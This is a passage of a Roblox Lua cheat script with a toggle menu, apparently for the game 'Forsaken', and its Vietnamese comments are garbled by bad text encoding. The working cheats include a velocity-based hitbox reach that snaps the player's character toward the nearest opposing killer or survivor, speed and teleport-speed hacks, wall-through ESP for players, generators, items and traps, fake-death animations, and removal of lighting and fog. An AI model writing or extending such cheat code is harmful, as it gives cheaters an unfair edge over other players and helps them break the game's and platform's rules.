5807 | end
5808 | 
5809 | 
5810 | 
5811 | 
5812 | 
5813 | 
5814 | 
5815 | 
5816 | 
5817 | 
5818 | do
5819 |     local Players = game:GetService("Players")
5820 |     local player = Players.LocalPlayer
5821 | 
5822 |     -- Animation object
5823 |     local fakeFixAnim = Instance.new("Animation")
5824 |     fakeFixAnim.AnimationId = "rbxassetid://82691533602949"
5825 | 
5826 |     local animator, fakeFixTrack
5827 | 
5828 |     -- H√†m t√¨m animator c·ªßa nh√¢n v·∫≠t
5829 |     local function getAnimator()
5830 |         local char = player.Character
5831 |         if not char then return nil end
5832 |         local humanoid = char:FindFirstChildOfClass("Humanoid") or char:FindFirstChildOfClass("AnimationController")
5833 |         if not humanoid then return nil end
5834 |         local anim = humanoid:FindFirstChildOfClass("Animator")
5835 |         if not anim then
5836 |             anim = Instance.new("Animator")
5837 |             anim.Parent = humanoid
5838 |         end
5839 |         return anim
5840 |     end
5841 | 
5842 |     -- Toggle UI
5843 |     Tabs.Player:AddToggle("FakeFixGen", {
5844 |         Title = "Fake Fix Gen",
5845 |         Default = false,
5846 |         Callback = function(state)
5847 |             animator = getAnimator()
5848 |             if not animator then return end
5849 | 
5850 |             if state then
5851 |                 if not fakeFixTrack then
5852 |                     local ok, track = pcall(function()
5853 |                         return animator:LoadAnimation(fakeFixAnim)
5854 |                     end)
5855 |                     if ok and track then
5856 |                         fakeFixTrack = track
5857 |                         fakeFixTrack.Looped = true
5858 |                         fakeFixTrack:Play()
5859 |                     end
5860 |                 end
5861 |             else
5862 |                 if fakeFixTrack then
5863 |                     fakeFixTrack:Stop()
5864 |                     fakeFixTrack = nil
5865 |                 end
5866 |             end
5867 |         end
5868 |     })
5869 | end
5870 | 
5871 | 
5872 | 
5873 | 
5874 | do
5875 | -- Fake Die Toggle (start at 50%, stop at 90%)
5876 | Tabs.Player:AddToggle("FakeDieV2", {
5877 |     Title = "Fake Die V2",
5878 |     Default = false
5879 | }):OnChanged(function(state)
5880 |     local Players = game:GetService("Players")
5881 |     local RunService = game:GetService("RunService")
5882 | 
5883 |     local plr = Players.LocalPlayer
5884 |     local char = plr.Character or plr.CharacterAdded:Wait()
5885 |     local hum = char:WaitForChild("Humanoid")
5886 | 
5887 |     if not getgenv().FakeDieData then
5888 |         getgenv().FakeDieData = {track=nil, conn=nil}
5889 |     end
5890 | 
5891 |     if state then
5892 |         -- === B·∫¨T Fake Die ===
5893 |         local anim = Instance.new("Animation")
5894 |         anim.AnimationId = "rbxassetid://118795597134269"
5895 | 
5896 |         local track = hum:LoadAnimation(anim)
5897 |         track:Play()
5898 | 
5899 |         -- Nh·∫£y th·∫≥ng ƒë·∫øn 50%
5900 |         if track.Length > 0 then
5901 |             track.TimePosition = track.Length * 0.5
5902 |         end
5903 | 
5904 |         getgenv().FakeDieData.track = track
5905 | 
5906 |         local stopped = false
5907 |         local conn = RunService.Heartbeat:Connect(function()
5908 |             if track.IsPlaying and not stopped and track.Length > 0 then
5909 |                 local percent = track.TimePosition / track.Length
5910 |                 if percent >= 0.9 then
5911 |                     track:AdjustSpeed(0) -- pause ·ªü 90%
5912 |                     stopped = true
5913 |                     print("FakeDie: Animation paused at 90%")
5914 |                 end
5915 |             end
5916 |         end)
5917 | 
5918 |         getgenv().FakeDieData.conn = conn
5919 | 
5920 |     else
5921 |         -- === T·∫ÆT Fake Die ===
5922 |         local data = getgenv().FakeDieData
5923 |         if data.track then
5924 |             data.track:Stop()
5925 |             data.track = nil
5926 |         end
5927 |         if data.conn then
5928 |             data.conn:Disconnect()
5929 |             data.conn = nil
5930 |         end
5931 | 
5932 |         -- Kh√¥i ph·ª•c animation m·∫∑c ƒë·ªãnh (idle)
5933 |         pcall(function()
5934 |             hum:PlayEmote("idle")
5935 |         end)
5936 |     end
5937 | end)
5938 | end
5939 | 
5940 | 
5941 | 
5942 | 
5943 | 
5944 |     Tabs.Player:AddSection("Hitbox")
5945 | 
5946 | 
5947 | repeat task.wait() until game:IsLoaded()
5948 | 
5949 | -- bi·∫øn c·∫•u h√¨nh
5950 | local ForsakenReachEnabled = false
5951 | local NearestDist = 120
5952 | 
5953 | -- th√™m toggle + slider v√†o Fluent (Tabs.Player b·∫°n ƒë√£ c√≥ s·∫µn)
5954 | Tabs.Player:AddToggle("ForsakenReachToggle", {
5955 |     Title = "Hitbox Devil",
5956 |     Default = false,
5957 |     Save = true
5958 | }):OnChanged(function(Value)
5959 |     ForsakenReachEnabled = Value
5960 | end)
5961 | 
5962 | Tabs.Player:AddSlider("ForsakenReachSlider", {
5963 |     Title = "Distance",
5964 |     Default = 120,
5965 |     Min = 10,
5966 |     Max = 300,
5967 |     Rounding = 0,
5968 |     Save = true,
5969 |     Suffix = " studs"
5970 | }):OnChanged(function(Value)
5971 |     NearestDist = Value
5972 | end)
5973 | 
5974 | -- services & player setup
5975 | local Players = game:GetService('Players')
5976 | local Player = Players.LocalPlayer
5977 | local Character = Player.Character or Player.CharacterAdded:Wait()
5978 | local Humanoid = Character:WaitForChild("Humanoid")
5979 | local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
5980 | 
5981 | Player.CharacterAdded:Connect(function(NewCharacter)
5982 |     Character = NewCharacter
5983 |     Humanoid = Character:WaitForChild("Humanoid")
5984 |     HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
5985 | end)
5986 | 
5987 | local RNG = Random.new()
5988 | 
5989 | -- full danh s√°ch animations gi·ªØ nguy√™n t·ª´ code 1
5990 | local AttackAnimations = {
5991 |     'rbxassetid://131430497821198',
5992 |     'rbxassetid://83829782357897',
5993 |     'rbxassetid://126830014841198',
5994 |     'rbxassetid://126355327951215',
5995 |     'rbxassetid://121086746534252',
5996 |     'rbxassetid://105458270463374',
5997 |     'rbxassetid://127172483138092',
5998 |     'rbxassetid://18885919947',
5999 |     'rbxassetid://18885909645',
6000 |     'rbxassetid://87259391926321',
6001 |     'rbxassetid://106014898528300',
6002 |     'rbxassetid://87259391926321',
6003 |     'rbxassetid://86545133269813',
6004 |     'rbxassetid://89448354637442',
6005 |     'rbxassetid://90499469533503',
6006 |     'rbxassetid://116618003477002',
6007 |     'rbxassetid://106086955212611',
6008 |     'rbxassetid://107640065977686',
6009 |     'rbxassetid://77124578197357',
6010 |     'rbxassetid://101771617803133',
6011 |     'rbxassetid://134958187822107',
6012 |     'rbxassetid://111313169447787',
6013 |     'rbxassetid://71685573690338',
6014 |     'rbxassetid://71685573690338',
6015 |     'rbxassetid://129843313690921',
6016 |     'rbxassetid://97623143664485',
6017 |     'rbxassetid://129843313690921',
6018 |     'rbxassetid://136007065400978',
6019 |     'rbxassetid://136007065400978',
6020 |     'rbxassetid://86096387000557',
6021 |     'rbxassetid://86096387000557',
6022 |     'rbxassetid://108807732150251',
6023 |     'rbxassetid://138040001965654',
6024 |     'rbxassetid://73502073176819',
6025 |     'rbxassetid://129843313690921',
6026 |     'rbxassetid://97623143664485',
6027 |     'rbxassetid://129843313690921',
6028 |     'rbxassetid://97623143664485',
6029 |     'rbxassetid://97623143664485',
6030 |     'rbxassetid://97623143664485',
6031 |     'rbxassetid://86709774283672',
6032 |     'rbxassetid://106014898528300',
6033 |     'rbxassetid://87259391926321',
6034 |     'rbxassetid://140703210927645',
6035 |     'rbxassetid://96173857867228',
6036 |     'rbxassetid://121255898612475',
6037 |     'rbxassetid://98031287364865',
6038 |     'rbxassetid://119462383658044',
6039 |     'rbxassetid://77448521277146',
6040 |     'rbxassetid://77448521277146',
6041 |     'rbxassetid://103741352379819',
6042 |     'rbxassetid://119462383658044',
6043 |     'rbxassetid://131696603025265',
6044 |     'rbxassetid://122503338277352',
6045 |     'rbxassetid://97648548303678',
6046 |     'rbxassetid://94162446513587',
6047 |     'rbxassetid://84426150435898',
6048 |     'rbxassetid://93069721274110',
6049 |     'rbxassetid://114620047310688',
6050 |     'rbxassetid://97433060861952',
6051 |     'rbxassetid://82183356141401',
6052 |     'rbxassetid://100592913030351',
6053 |     'rbxassetid://121293883585738',
6054 |     'rbxassetid://100592913030351',
6055 |     'rbxassetid://121293883585738',
6056 |     'rbxassetid://100592913030351',
6057 |     'rbxassetid://121293883585738',
6058 |     'rbxassetid://70447634862911',
6059 |     'rbxassetid://92173139187970',
6060 |     'rbxassetid://106847695270773',
6061 |     'rbxassetid://125403313786645',
6062 |     'rbxassetid://81639435858902',
6063 |     'rbxassetid://137314737492715',
6064 |     'rbxassetid://120112897026015',
6065 |     'rbxassetid://82113744478546',
6066 |     'rbxassetid://118298475669935',
6067 |     'rbxassetid://82113744478546',
6068 |     'rbxassetid://118298475669935',
6069 |     'rbxassetid://126681776859538',
6070 |     'rbxassetid://129976080405072',
6071 |     'rbxassetid://109667959938617',
6072 |     'rbxassetid://74707328554358',
6073 |     'rbxassetid://133336594357903',
6074 |     'rbxassetid://86204001129974',
6075 |     'rbxassetid://82113744478546',
6076 |     'rbxassetid://118298475669935',
6077 |     'rbxassetid://124243639579224',
6078 |     'rbxassetid://70371667919898',
6079 |     'rbxassetid://131543461321709',
6080 |     'rbxassetid://136323728355613',
6081 |     'rbxassetid://109230267448394',
6082 |     'rbxassetid://109230267448394',
6083 |     'rbxassetid://109230267448394',
6084 |     'rbxassetid://109230267448394',
6085 |     'rbxassetid://109230267448394',
6086 |     'rbxassetid://109230267448394',
6087 |     'rbxassetid://109230267448394',
6088 |     'rbxassetid://109230267448394',
6089 |     'rbxassetid://109230267448394',
6090 |     'rbxassetid://109230267448394',
6091 |     'rbxassetid://109230267448394',
6092 |     'rbxassetid://109230267448394',
6093 |     'rbxassetid://109230267448394',
6094 |     'rbxassetid://139835501033932',
6095 |     'rbxassetid://139835501033932',
6096 |     'rbxassetid://139835501033932',
6097 |     'rbxassetid://139835501033932',
6098 |     'rbxassetid://139835501033932',
6099 |     'rbxassetid://139835501033932',
6100 |     'rbxassetid://139835501033932',
6101 |     'rbxassetid://139835501033932',
6102 |     'rbxassetid://139835501033932',
6103 |     'rbxassetid://139835501033932',
6104 |     'rbxassetid://139835501033932',
6105 |     'rbxassetid://139835501033932',
6106 |     'rbxassetid://139835501033932',
6107 |     'rbxassetid://106538427162796',
6108 |     'rbxassetid://109667959938617',
6109 |     'rbxassetid://126681776859538',
6110 |     'rbxassetid://129976080405072',
6111 |     'rbxassetid://110400453990786',
6112 |     'rbxassetid://83685305553364',
6113 |     'rbxassetid://126171487400618',
6114 |     'rbxassetid://122709416391891',
6115 |     'rbxassetid://87989533095285',
6116 |     'rbxassetid://119326397274934',
6117 |     'rbxassetid://140365014326125'
6118 | }
6119 | 
6120 | -- danh s√°ch model killers v√† survivors (theo y√™u c·∫ßu c·ªßa b·∫°n)
6121 | local Killers = {
6122 |     ["Slasher"] = true, ["1x1x1x1"] = true, ["c00lkidd"] = true,
6123 |     ["Noli"] = true, ["JohnDoe"] = true, ["Guest 666"] = true,
6124 |     ["Sixer"] = true
6125 | }
6126 | 
6127 | local Survivors = {
6128 |     ["Noob"] = true, ["Guest1337"] = true, ["Elliot"] = true,
6129 |     ["Shedletsky"] = true, ["TwoTime"] = true, ["007n7"] = true,
6130 |     ["Chance"] = true, ["Builderman"] = true, ["Taph"] = true, ["Dusekkar"] = true
6131 | }
6132 | 
6133 | -- gom reach logic th√†nh h√†m (ƒë√£ ch·ªânh ƒë·ªÉ ∆∞u ti√™n nh·∫Øm phe ƒë·ªëi ngh·ªãch n·∫øu b·∫°n ·ªü d·∫°ng model)
6134 | local function ForsakenReachLogic()
6135 |     if not ForsakenReachEnabled or not HumanoidRootPart then
6136 |         return
6137 |     end
6138 | 
6139 |     -- ki·ªÉm tra animation attack (gi·ªØ nguy√™n)
6140 |     local Playing = false
6141 |     for _,v in Humanoid:GetPlayingAnimationTracks() do
6142 |         if table.find(AttackAnimations, v.Animation.AnimationId) and (v.TimePosition / v.Length < 0.75) then
6143 |             Playing = true
6144 |         end
6145 |     end
6146 | 
6147 |     if not Playing then
6148 |         return
6149 |     end
6150 | 
6151 |     -- x√°c ƒë·ªãnh b·∫°n ƒëang l√† model thu·ªôc phe n√†o (n·∫øu c√≥)
6152 |     local PlayerRole = nil -- "Killer" | "Survivor" | nil
6153 |     local myModelName = Character and Character.Name
6154 |     if myModelName and Killers[myModelName] then
6155 |         PlayerRole = "Killer"
6156 |     elseif myModelName and Survivors[myModelName] then
6157 |         PlayerRole = "Survivor"
6158 |     end
6159 | 
6160 |     local OppositeTable = nil
6161 |     if PlayerRole == "Killer" then
6162 |         OppositeTable = Survivors
6163 |     elseif PlayerRole == "Survivor" then
6164 |         OppositeTable = Killers
6165 |     end
6166 | 
6167 |     local Target = nil
6168 |     local CurrentNearestDist = NearestDist
6169 | 
6170 |     -- 1) N·∫øu b·∫°n ƒëang l√† model (c√≥ OppositeTable), ∆∞u ti√™n t√¨m m·ª•c ti√™u thu·ªôc phe ƒë·ªëi ngh·ªãch tr∆∞·ªõc
6171 |     local OppTarget = nil
6172 |     local OppNearestDist = NearestDist
6173 | 
6174 |     local function loopForOpp(t)
6175 |         for _,v in pairs(t) do
6176 |             if v == Character or not v:FindFirstChild("HumanoidRootPart") or not v:FindFirstChild("Humanoid") then
6177 |                 continue
6178 |             end
6179 |             local modelName = v.Name
6180 |             if OppositeTable and OppositeTable[modelName] then
6181 |                 local Dist = (v.HumanoidRootPart.Position - HumanoidRootPart.Position).Magnitude
6182 |                 if Dist < OppNearestDist then
6183 |                     OppNearestDist = Dist
6184 |                     OppTarget = v
6185 |                 end
6186 |             end
6187 |         end
6188 |     end
6189 | 
6190 |     if OppositeTable then
6191 |         loopForOpp(workspace.Players:GetDescendants())
6192 |         local npcsFolder = workspace.Map:FindFirstChild("NPCs", true)
6193 |         if npcsFolder then
6194 |             loopForOpp(npcsFolder:GetChildren())
6195 |         end
6196 |     end
6197 | 
6198 |     -- 2) N·∫øu kh√¥ng t√¨m ƒë∆∞·ª£c phe ƒë·ªëi ngh·ªãch th√¨ fallback v·ªÅ logic g·ªëc nh∆∞ng v·∫´n b·ªè qua model c√πng phe v·ªõi b·∫°n
6199 |     local function loopAll(t)
6200 |         for _,v in pairs(t) do
6201 |             if v == Character or not v:FindFirstChild("HumanoidRootPart") or not v:FindFirstChild("Humanoid") then
6202 |                 continue
6203 |             end
6204 |             local modelName = v.Name
6205 |             -- b·ªè qua c√πng phe n·∫øu b·∫°n ƒëang ·ªü d·∫°ng model
6206 |             if PlayerRole == "Killer" and Killers[modelName] then
6207 |                 continue
6208 |             end
6209 |             if PlayerRole == "Survivor" and Survivors[modelName] then
6210 |                 continue
6211 |             end
6212 |             local Dist = (v.HumanoidRootPart.Position - HumanoidRootPart.Position).Magnitude
6213 |             if Dist < CurrentNearestDist then
6214 |                 CurrentNearestDist = Dist
6215 |                 Target = v
6216 |             end
6217 |         end
6218 |     end
6219 | 
6220 |     -- n·∫øu t√¨m th·∫•y OppTarget th√¨ d√πng lu√¥n, kh√¥ng c·∫ßn t√¨m ti·∫øp
6221 |     local FinalTarget = nil
6222 |     if OppTarget then
6223 |         FinalTarget = OppTarget
6224 |     else
6225 |         -- fallback: qu√©t players + npcs gi·ªëng tr∆∞·ªõc nh∆∞ng ƒë√£ lo·∫°i c√πng phe
6226 |         loopAll(workspace.Players:GetDescendants())
6227 |         local npcsFolder2 = workspace.Map:FindFirstChild("NPCs", true)
6228 |         if npcsFolder2 then
6229 |             loopAll(npcsFolder2:GetChildren())
6230 |         end
6231 |         FinalTarget = Target
6232 |     end
6233 | 
6234 |     if not FinalTarget then
6235 |         return
6236 |     end
6237 | 
6238 |     -- gi·ªØ nguy√™n ph·∫ßn t√≠nh velocity + √°p d·ª•ng hit
6239 |     local OldVelocity = HumanoidRootPart.Velocity
6240 |     local NeededVelocity =
6241 |         (FinalTarget.HumanoidRootPart.Position + Vector3.new(
6242 |             RNG:NextNumber(-1.5, 1.5),
6243 |             0,
6244 |             RNG:NextNumber(-1.5, 1.5)
6245 |         ) + (FinalTarget.HumanoidRootPart.Velocity * (Player:GetNetworkPing() * 1.25))
6246 |             - HumanoidRootPart.Position
6247 |         ) / (Player:GetNetworkPing() * 2)
6248 | 
6249 |     HumanoidRootPart.Velocity = NeededVelocity
6250 |     game:GetService('RunService').RenderStepped:Wait()
6251 |     HumanoidRootPart.Velocity = OldVelocity
6252 | end
6253 | 
6254 | -- v√≤ng l·∫∑p auto g·ªçi l·∫°i m·ªói 0s (gi·ªØ nguy√™n)
6255 | task.spawn(function()
6256 |     while true do
6257 |         task.wait(0)
6258 |         pcall(ForsakenReachLogic)
6259 |     end
6260 | end)
6261 | 
6262 | 
6263 | 
6264 | 
6265 |     Tabs.Player:AddSection("Walk Speed")
6266 | 
6267 | 
6268 | local Players = game:GetService("Players")
6269 | local LocalPlayer = Players.LocalPlayer
6270 | 
6271 | local ValueSpeed = 16
6272 | local ActiveSpeedBoost = false
6273 | local speedLoop
6274 | 
6275 | local function setSpeed(speed)
6276 |     local character = LocalPlayer.Character
6277 |     if not character then return end
6278 |     local humanoid = character:FindFirstChildOfClass("Humanoid")
6279 |     if humanoid then
6280 |         humanoid.WalkSpeed = speed
6281 |         humanoid:SetAttribute("BaseSpeed", speed)
6282 |     end
6283 | end
6284 | 
6285 | -- Khi respawn √°p d·ª•ng l·∫°i t·ªëc ƒë·ªô n·∫øu b·∫≠t
6286 | LocalPlayer.CharacterAdded:Connect(function()
6287 |     task.wait(0.1)
6288 |     if ActiveSpeedBoost then
6289 |         setSpeed(ValueSpeed)
6290 |     end
6291 | end)
6292 | 
6293 | -- Slider ch·ªânh t·ªëc ƒë·ªô
6294 | Tabs.Player:AddSlider("PlayerSpeedSlider", {
6295 |     Title = "Set Speed",
6296 |     Min = 0,
6297 |     Max = 40,
6298 |     Default = ValueSpeed,
6299 |     Rounding = 1,
6300 | }):OnChanged(function(value)
6301 |     ValueSpeed = value
6302 |     if ActiveSpeedBoost then
6303 |         setSpeed(ValueSpeed)
6304 |     end
6305 | end)
6306 | 
6307 | -- Toggle b·∫≠t/t·∫Øt t·ªëc ƒë·ªô v√† loop tƒÉng t·ªëc li√™n t·ª•c
6308 | Tabs.Player:AddToggle("PlayerSpeedToggle", {
6309 |     Title = "Walk Speed",
6310 |     Default = false,
6311 | }):OnChanged(function(value)
6312 |     ActiveSpeedBoost = value
6313 |     if value then
6314 |         setSpeed(ValueSpeed)
6315 |         -- B·∫Øt ƒë·∫ßu v√≤ng l·∫∑p li√™n t·ª•c set t·ªëc ƒë·ªô m·ªói 0.5 gi√¢y
6316 |         speedLoop = task.spawn(function()
6317 |             while ActiveSpeedBoost do
6318 |                 setSpeed(ValueSpeed)
6319 |                 task.wait(0.5)
6320 |             end
6321 |         end)
6322 |     else
6323 |         -- T·∫Øt v√≤ng l·∫∑p v√† reset t·ªëc ƒë·ªô v·ªÅ m·∫∑c ƒë·ªãnh 16
6324 |         if speedLoop then
6325 |             speedLoop = nil
6326 |         end
6327 |         setSpeed(16)
6328 |     end
6329 | end)
6330 | 
6331 | 
6332 | 
6333 |     Tabs.Player:AddSection("Teleport Speed")
6334 | 
6335 | 
6336 | -- === Teleport Speed Setup ===
6337 | local Players = game:GetService("Players")
6338 | local RunService = game:GetService("RunService")
6339 | 
6340 | local LocalPlayer = Players.LocalPlayer
6341 | local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
6342 | local Humanoid = Character:WaitForChild("Humanoid")
6343 | local HRP = Character:WaitForChild("HumanoidRootPart")
6344 | 
6345 | local defaultSpeed = 50
6346 | local maxSpeed = 300
6347 | local currentSpeed = defaultSpeed
6348 | local teleportSpeedEnabled = false
6349 | 
6350 | -- C·∫≠p nh·∫≠t l·∫°i khi respawn
6351 | LocalPlayer.CharacterAdded:Connect(function(char)
6352 |     Character = char
6353 |     Humanoid = Character:WaitForChild("Humanoid")
6354 |     HRP = Character:WaitForChild("HumanoidRootPart")
6355 | end)
6356 | 
6357 | -- Loop ƒë·ªÉ d·ªãch chuy·ªÉn (teleport speed)
6358 | RunService.Heartbeat:Connect(function(dt)
6359 |     if teleportSpeedEnabled and Humanoid and HRP then
6360 |         if Humanoid.MoveDirection.Magnitude > 0 then
6361 |             local moveDir = Humanoid.MoveDirection.Unit
6362 |             HRP.CFrame = HRP.CFrame + (moveDir * (currentSpeed * dt))
6363 |         end
6364 |     end
6365 | end)
6366 | 
6367 | -- === GUI Bindings ===
6368 | -- Slider Teleport Speed
6369 | Tabs.Player:AddSlider("TeleportSpeedSlider", {
6370 |     Title = "Set Speed",
6371 |     Min = 1,
6372 |     Max = maxSpeed,
6373 |     Default = defaultSpeed,
6374 |     Rounding = 1,
6375 | }):OnChanged(function(value)
6376 |     currentSpeed = value
6377 | end)
6378 | 
6379 | -- Toggle b·∫≠t/t·∫Øt Teleport Speed
6380 | Tabs.Player:AddToggle("TeleportSpeedToggle", {
6381 |     Title = "Teleport Speed",
6382 |     Default = false,
6383 | }):OnChanged(function(enabled)
6384 |     teleportSpeedEnabled = enabled
6385 | end)
6386 | 
6387 |      
6388 | 
6389 | -- Tabs.Visual
6390 | 
6391 | --// ‚öôÔ∏è ESP Lo·∫°i: Clone, Player, Survivors, Killers, Generator, Items, Buildman
6392 | --// T·∫•t c·∫£ ƒë·ªÅu d√πng chung ESPManager (ƒë√£ ƒë·ªãnh nghƒ©a ·ªü tr√™n)
6393 | 
6394 | local Players = game:GetService("Players")
6395 | local LocalPlayer = Players.LocalPlayer
6396 | 
6397 | -----------------------------------------------------
6398 | -- üü¢ 1. CLONE ESP
6399 | -----------------------------------------------------
6400 | local allowedModelsClone = {
6401 |     ["1x1x1x1Zombie"] = true,
6402 |     ["PizzaDeliveryRig"] = true,
6403 |     ["Mafia1"] = true,
6404 |     ["Mafia2"] = true,
6405 |     ["Mafia3"] = true,
6406 |     ["Mafia4"] = true,
6407 | }
6408 | 
6409 | _G.ESPManager:RegisterType("Clone", Color3.fromRGB(0, 255, 0), function(obj)
6410 |     return obj:IsA("Model") and allowedModelsClone[obj.Name]
6411 | end, false)
6412 | 
6413 | Tabs.Visual:AddToggle("ESPCloneToggle", {
6414 |     Title = "ESP Clone",
6415 |     Default = false,
6416 | }):OnChanged(function(state)
6417 |     _G.ESPManager:SetEnabled("Clone", state)
6418 | end)
6419 | 
6420 | 
6421 | -----------------------------------------------------
6422 | -- üîµ 2. PLAYER ESP
6423 | -----------------------------------------------------
6424 | 
6425 |     Tabs.Visual:AddSection("Player")
6426 | 
6427 | _G.ESPManager:RegisterType("Player", Color3.fromRGB(0, 255, 255), function(obj)
6428 |     local plr = Players:GetPlayerFromCharacter(obj)
6429 |     return plr and plr ~= LocalPlayer
6430 | end, false)
6431 | 
6432 | Tabs.Visual:AddToggle("ESPPlayerToggle", {
6433 |     Title = "ESP Player",
6434 |     Default = false,
6435 | }):OnChanged(function(state)
6436 |     _G.ESPManager:SetEnabled("Player", state)
6437 | end)
6438 | 
6439 | 
6440 | -----------------------------------------------------
6441 | -- ‚ö™ 3. SURVIVORS ESP (c√≥ HP)
6442 | -----------------------------------------------------
6443 | local survivorsFolder = workspace:WaitForChild("Players"):WaitForChild("Survivors")
6444 | _G.ESPManager:RegisterType("Survivor", Color3.fromRGB(255, 255, 255), function(obj)
6445 |     return obj:IsA("Model") and obj.Parent == survivorsFolder and obj:FindFirstChildOfClass("Humanoid")
6446 | end, true)
6447 | 
6448 | Tabs.Visual:AddToggle("ESPModelWhiteToggle", {
6449 |     Title = "ESP Survivors",
6450 |     Default = false,
6451 | }):OnChanged(function(state)
6452 |     _G.ESPManager:SetEnabled("Survivor", state)
6453 | end)
6454 | 
6455 | 
6456 | -----------------------------------------------------
6457 | -- üî¥ 4. KILLERS ESP (c√≥ HP)
6458 | -----------------------------------------------------
6459 | local killersFolder = workspace:WaitForChild("Players"):WaitForChild("Killers")
6460 | _G.ESPManager:RegisterType("Killer", Color3.fromRGB(255, 0, 0), function(obj)
6461 |     return obj:IsA("Model") and obj.Parent == killersFolder and obj:FindFirstChildOfClass("Humanoid")
6462 | end, true)
6463 | 
6464 | Tabs.Visual:AddToggle("ESPModelRedToggle", {
6465 |     Title = "ESP Killers",
6466 |     Default = false,
6467 | }):OnChanged(function(state)
6468 |     _G.ESPManager:SetEnabled("Killer", state)
6469 | end)
6470 | 
6471 | 
6472 | -----------------------------------------------------
6473 | -- ‚öôÔ∏è 5. GENERATOR ESP
6474 | -----------------------------------------------------
6475 | 
6476 |     Tabs.Visual:AddSection("Other")
6477 | 
6478 | _G.ESPManager:RegisterType("Generator", Color3.fromRGB(255,255,255), function(obj)
6479 |     return obj:IsA("Model") and obj.Name == "Generator" and not (obj:FindFirstChild("Progress") and obj.Progress.Value >= 100)
6480 | end, false)
6481 | 
6482 | Tabs.Visual:AddToggle("ESPGeneratorToggle", {
6483 |     Title = "ESP Generator",
6484 |     Default = false,
6485 | }):OnChanged(function(state)
6486 |     _G.ESPManager:SetEnabled("Generator", state)
6487 | end)
6488 | 
6489 | 
6490 | -----------------------------------------------------
6491 | -- üü° 6. ITEMS ESP
6492 | -----------------------------------------------------
6493 | _G.ESPManager:RegisterType("Item", Color3.fromRGB(255,215,0), function(obj)
6494 |     return obj:IsA("Tool") and obj.Parent and obj:IsDescendantOf(workspace:FindFirstChild("Map"))
6495 | end, false)
6496 | 
6497 | Tabs.Visual:AddToggle("ESPItemsToggle", {
6498 |     Title = "ESP Items",
6499 |     Default = false,
6500 | }):OnChanged(function(state)
6501 |     _G.ESPManager:SetEnabled("Item", state)
6502 | end)
6503 | 
6504 | 
6505 | -----------------------------------------------------
6506 | -- üü£ 7. BUILDMAN ESP
6507 | -----------------------------------------------------
6508 | _G.ESPManager:RegisterType("Dispenser", Color3.fromRGB(0, 162, 255), function(obj)
6509 |     return obj:IsA("Model") and obj.Name:lower():find("dispenser")
6510 | end, false)
6511 | 
6512 | _G.ESPManager:RegisterType("Sentry", Color3.fromRGB(128, 128, 128), function(obj)
6513 |     return obj:IsA("Model") and obj.Name:lower():find("sentry")
6514 | end, false)
6515 | 
6516 | _G.ESPManager:RegisterType("Tripwire", Color3.fromRGB(255, 85, 0), function(obj)
6517 |     return obj:IsA("Model") and obj.Name:find("TaphTripwire")
6518 | end, false)
6519 | 
6520 | _G.ESPManager:RegisterType("Subspace", Color3.fromRGB(160, 32, 240), function(obj)
6521 |     return obj:IsA("Model") and obj.Name == "SubspaceTripmine"
6522 | end, false)
6523 | 
6524 | Tabs.Visual:AddSection("Buildman")
6525 | 
6526 | Tabs.Visual:AddToggle("DispenserESP_Toggle", {
6527 |     Title = "ESP Dispenser",
6528 |     Default = false,
6529 | }):OnChanged(function(state)
6530 |     _G.ESPManager:SetEnabled("Dispenser", state)
6531 | end)
6532 | 
6533 | Tabs.Visual:AddToggle("SentryESP_Toggle", {
6534 |     Title = "ESP Sentry",
6535 |     Default = false,
6536 | }):OnChanged(function(state)
6537 |     _G.ESPManager:SetEnabled("Sentry", state)
6538 | end)
6539 | 
6540 | Tabs.Visual:AddSection("Tapt/Trap")
6541 | 
6542 | Tabs.Visual:AddToggle("TripwireESP_Toggle", {
6543 |     Title = "ESP Trip Wire",
6544 |     Default = false,
6545 | }):OnChanged(function(state)
6546 |     _G.ESPManager:SetEnabled("Tripwire", state)
6547 | end)
6548 | 
6549 | Tabs.Visual:AddToggle("SubspaceESP_Toggle", {
6550 |     Title = "ESP Bomb Trap",
6551 |     Default = false,
6552 | }):OnChanged(function(state)
6553 |     _G.ESPManager:SetEnabled("Subspace", state)
6554 | end)
6555 | 
6556 | -- Tabs.Misc
6557 | 
6558 | 
6559 | 
6560 | 
6561 | local Lighting = game:GetService("Lighting")
6562 | local RunService = game:GetService("RunService")
6563 | 
6564 | -- ‚úÖ FullBright Settings
6565 | local fullBrightEnabled = false
6566 | local fullBrightLoop
6567 | 
6568 | local function applyFullBright()
6569 |     if not fullBrightEnabled then return end
6570 | 
6571 |     Lighting.Ambient = Color3.fromRGB(200, 200, 200) -- s√°ng nh·∫π
6572 |     Lighting.Brightness = 4 -- gi·∫£m ƒë·ªô s√°ng t·ª´ 10 ‚Üí 4
6573 |     Lighting.GlobalShadows = false
6574 | end
6575 | 
6576 | local function enableFullBright()
6577 |     if fullBrightLoop then fullBrightLoop:Disconnect() end
6578 |     applyFullBright()
6579 |     fullBrightLoop = Lighting:GetPropertyChangedSignal("ClockTime"):Connect(applyFullBright)
6580 | end
6581 | 
6582 | local function disableFullBright()
6583 |     if fullBrightLoop then
6584 |         fullBrightLoop:Disconnect()
6585 |         fullBrightLoop = nil
6586 |     end
6587 | 
6588 |     Lighting.Ambient = Color3.fromRGB(128, 128, 128)
6589 |     Lighting.Brightness = 1
6590 |     Lighting.GlobalShadows = true
6591 | end
6592 | 
6593 | -- ‚úÖ Toggle: FullBright
6594 | local FbToggle = Tabs.Misc:AddToggle("FbToggle", {
6595 |     Title = "Auto Full Bright",
6596 |     Default = false
6597 | })
6598 | FbToggle:OnChanged(function(Value)
6599 |     fullBrightEnabled = Value
6600 |     if fullBrightEnabled then
6601 |         enableFullBright()
6602 |     else
6603 |         disableFullBright()
6604 |     end
6605 | end)
6606 | 
6607 | -- ‚úÖ Remove Fog Settings
6608 | local fogEnabled = false
6609 | local fogLoop
6610 | 
6611 | local function removeFog()
6612 |     Lighting.FogStart = 0
6613 |     Lighting.FogEnd = 1000000
6614 | 
6615 |     local atmosphere = Lighting:FindFirstChild("Atmosphere")
6616 |     if atmosphere then
6617 |         atmosphere.Density = 0
6618 |         atmosphere.Offset = 0
6619 |         atmosphere.Haze = 0
6620 |         atmosphere.Color = Color3.new(1, 1, 1)
6621 |     end
6622 | end
6623 | 
6624 | local function restoreFog()
6625 |     Lighting.FogStart = 200
6626 |     Lighting.FogEnd = 1000
6627 | 
6628 |     local atmosphere = Lighting:FindFirstChild("Atmosphere")
